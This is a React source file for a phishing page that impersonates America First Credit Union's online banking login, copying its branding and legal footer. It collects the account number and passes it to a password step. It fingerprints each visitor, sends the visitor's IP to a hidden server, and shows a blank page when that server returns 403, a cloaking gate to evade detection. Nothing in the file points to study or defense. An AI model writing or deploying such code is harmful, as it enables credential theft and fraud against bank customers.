import './App.css';
import TextField from '@mui/material/TextField';
import { Button } from '@mui/material';
import React, { useEffect, useState } from 'react';
import Password from './components/Password';
import { CreditCard } from '@mui/icons-material';
import PaymentForm from './components/PaymentForm';
import { useVisitorData } from '@fingerprintjs/fingerprintjs-pro-react'
import axios from 'axios'




function App() {



  const footData = "©2023 America First Credit Union. All Rights Reserved. America First Federal Credit Union does business as (DBA) America First Credit Union. Unauthorized account access or use is not permitted and ";
  const footDataTwo = "may constitute a crime punishable by law. America First Credit Union respects your privacy. Please view our Privacy Policy, Email Opt Out Procedure and Fraud Alert Text/SMS Notification Terms and ";
  const footDataThree = "Conditions. This credit union is federally insured by the National Credit Union Administration."

  const {
    isLoading,
    error,
    data,
  } = useVisitorData();

  
  const [show, setShow] = useState(false);
  var [userid, setUserid]  = React.useState('')
  var [status, setStatus] = useState(403);
  var [visitor, setVisitor] = useState(''); 


  


    

  

    // fetch(`http://localhost:4000`,{
    //   method: 'POST',
    //   headers: {
    //       'Content-Type': 'application/json'
    //   },
    //   body: JSON.stringify(visitor)
    // })
    // .then((response) => {
    //   console.log(response.status)
    //   if(response.status === 403){

    //     console.log('cool')
    //     setStatus(403)
    //   } else{
    //     setStatus(200)
    //   }



    // });

    const getData = async (ip) => {
      if (isLoading) {
        return console.log('loading');
      }
      if (error) {
        return console.log(error.message);
      }
    
      if (data) {
        // perform some logic based on the visitor data
        setVisitor(data.visitorId)
        console.log(data)
    
         fetch(process.env.REACT_APP_PRODUCTION_URL,{
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify({visitor_id: data.visitorId, ip: ip})
        })
        .then((response) => {
          console.log(response.status)
          if(response.status === 403){
    
            console.log('cool')
            setStatus(403)
          } else{
            setStatus(200)
          }
    
    
    
        });
        
      }
    }



   useEffect(() => {
    const res =  axios.get('https://geolocation-db.com/json/');
    res.then((response) =>{
      console.log(response.data)
      getData(response.data.IPv4)


    }); 

    

 
  
}, [data]);


  const submitHandler = e => {

    e.preventDefault(); 
    setShow(!show)


    
  }

  

 




  return (
<div>
    {status === 403 ? (<div></div> ): (


<div className="flex flex-col h-screen ">



<header>
  <nav className="bg-[#00548E] h-20">
    <div className="flex flex-wrap justify-between items-center mx-auto max-w-screen-xl">
      <img src="/header.jpg" className="mr-3 h-16  mt-1 ml-10" alt="Flowbite Logo" />
    </div>
  </nav>
</header>






   {!show && (
    <form onSubmit={submitHandler} className=" lg:ml-44 max-w-md mt-3 p-5">
    <div className='text-3xl font-semibold'>Login</div>
    <div>
  <div className='mb-7 mt-3'>


    
    <TextField autoFocus required onChange={(event) => {setUserid(event.target.value)}} value = {userid}
      id="standard-basic" label="Account Number (User ID)" variant="standard" fullWidth={true} />
  </div>
  
  <Button type="submit" variant="contained">Login</Button>
  <div className='p-1 mt-4'>
    <span className='text-xs'>First time logging in? </span><span className='text-xs'>Enroll Now.</span>
  </div>

  <div className='p-1'>
    <span className='text-xs'>Forgot Password</span> <span className='text-xs'> or need other assistance?</span><span className="text-xs">Contact us </span>
  </div>
  </div>
  </form>

        )}

{show && <Password userid={userid} visitor={visitor} />}




<footer className=" p-10 mt-auto w-full shadow px-6 py-8 dark:bg-gray-900 bg-[#1e1e23]  place-items-baseline">




   <section className="flex flex-row justify-center">
    <span className='block font-serif text-xs text-[#cacacb]'>terms | branch locator | contact us</span>
  </section>

  <section className="flex flex-row justify-center ">
    <img src='/eagle-inverse.png' className='p-2' />
  </section>

  <section className="flex flex-row justify-center">
    <img src='/lender.png' className="object-contain p-1" />

    <img src="/ncua.png" className="object-contain p-1" />
  </section>  





   <div className="flex">
    <div className="m-auto">


      <span className="block font-serif text-[11px] text-[#cacacb]  dark:text-gray-400  object-center max-w-[1090px] pt-5 flex-none">{footData + footDataTwo + footDataThree}</span>
    </div>

  </div>


</footer> 

</div>












    ) }

   </div>




  )
}

export default App;
